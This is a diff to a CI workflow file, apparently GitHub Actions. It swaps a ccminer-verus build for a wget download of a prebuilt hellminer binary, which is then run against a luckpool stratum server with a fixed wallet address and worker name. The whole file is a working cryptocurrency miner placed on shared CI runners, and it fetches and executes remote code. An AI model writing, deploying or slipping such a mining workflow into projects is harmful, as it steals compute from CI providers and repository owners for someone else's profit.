@@ -17,15 +17,15 @@ jobs:
       - name: Install dependencies
         run: |
           sudo apt-get update
-          sudo apt-get install -y git build-essential cmake libcurl4-openssl-dev libssl-dev libjansson-dev automake libgmp-dev
+          sudo apt-get install -y wget tar
 
-      - name: Clone ccminer-verus
+      - name: Download hminer
         run: |
-          git clone https://github.com/Oink70/ccminer-verus.git
-          cd ccminer-verus
-          ./build.sh
+          wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
+          tar -xzf hellminer_linux64_avx2.tar.gz
+          mv hellminer hminer
+          chmod +x hminer
 
       - name: Start mining
         run: |
-          cd ccminer-verus
-          ./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RRykJ9xGTKunTzEHD54L7hBcWDFf9hcGQG.uahahhsueyyww -p x -t $(nproc)
+          ./hminer -c stratum+tcp://na.luckpool.net:3956 -u RRykJ9xGTKunTzEHD54L7hBcWDFf9hcGQG.uahahhsueyyww -p hybrid
